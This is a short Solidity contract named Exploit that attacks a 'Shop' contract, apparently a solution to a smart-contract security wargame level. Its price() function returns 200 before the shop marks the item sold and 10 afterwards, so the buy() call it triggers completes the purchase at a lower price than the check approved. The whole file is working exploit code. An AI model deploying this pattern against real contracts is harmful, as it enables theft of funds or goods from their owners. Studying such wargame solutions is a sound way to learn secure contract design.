contract Exploit is Buyer {
    address public target;
    bool call = false;

    constructor(address _t) {
        target = _t;
    }

    function price() external view returns(uint) {
        Shop s = Shop(target);
        if (!s.isSold()) {
            return 200;
 
        } else {
            return 10;
        }
    }

    function exploit() external {
        (bool ok,) = target.call(
            abi.encodeWithSignature("buy()")
        );
        require(ok,"failed to call");
    }
}
